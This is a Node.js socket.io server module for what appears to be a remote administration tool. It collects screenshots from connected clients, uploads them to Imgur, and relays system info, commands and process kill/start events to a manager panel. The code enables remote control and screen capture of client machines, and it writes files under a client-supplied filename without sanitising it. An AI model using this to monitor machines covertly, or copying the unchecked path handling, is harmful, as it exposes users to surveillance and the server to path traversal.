const cache = require('../cache');
const fs = require('fs');
const path = require('path');

module.exports = (namespace, sio) => {
    namespace.on('connection', socket => {
        console.log(`Client ${socket.id} connected`)
        let clients = cache.get('clients');
        clients.push(socket.id);
        cache.set('clients', clients);
        //clients.push(socket.id);
        socket.join(socket.id);
        sio.of('/manager').emit('client_connected', {client: socket.id})
        sio.of('/manager').emit('notification', {message: `Polaczono ${socket.id}`, pos: 'bottom-right', status: 'success'})
        //clientNamespace.emit('screenshot');

        socket.on('disconnect', () => {
            //console.log(clients);
            const clientId = clients.indexOf(socket.id)
            clients.splice(clientId, 1);
            cache.set('clients', clients);
            console.log(`Client ${socket.id} disconnected`)
            sio.of('/manager').emit('client_disconnected', {client: socket.id})
            sio.of('/manager').emit('notification', {message: `Rozlaczono ${socket.id}`, pos: 'bottom-right', status: 'danger'})
        })

        socket.on('get_screenshoot', (data) => {
            console.log(data);
            const image = data.img
            const filename = data.filename
            const ssDir = `public/screenshoots/${socket.id}`;
            if (!fs.existsSync(ssDir)) {
                fs.mkdirSync(ssDir)
            }
            fs.writeFile(path.join(ssDir, filename), image, (e) => {
                if (e) {
                    return console.log(e);
                }
                console.log(`File ${filename} saved`);
                const imgur = require('imgur');

                imgur.setClientId(process.env.IMGUR_CLIENT_ID);
                imgur.createAlbum()
                    .then(function(json) {
                        console.log(json);
                        imgur.uploadFile(path.join(ssDir, filename), json.id)
                            .then(function (json) {
                                console.log(json.data.link);
                            })
                            .catch(function (err) {
                                console.error(err.message);
                            });
                    })
                    .catch(function (err) {
                        console.error(err.message);
                    });

            })
            sio.of('/manager').emit('ss_btn', {state: true})
        })

        socket.on('website', (data) => {
            sio.of('/manager').emit('website_btn', {state: true})
            sio.of('/manager').emit('notification', {...data.notification})
        })

        socket.on('command', (data) => {
            sio.of('/manager').emit('command', data);
        })

        socket.on('systemInfo', (data) => {
            sio.of('/manager').emit('systemInfo', data)
        })

        socket.on("process_list", (data) => {
            sio.of("/manager").emit('process_list', data);
        });

        socket.on("process_kill", (data) => {
            sio.of("/manager").emit('process_kill', data);
        })

        socket.on("process_start", (data) => {
            sio.of("/manager").emit('process_start', data);
        })

        socket.on("notification", (data) => {
            sio.of('/manager').emit('notification', {...data.notification})
        })
    })
}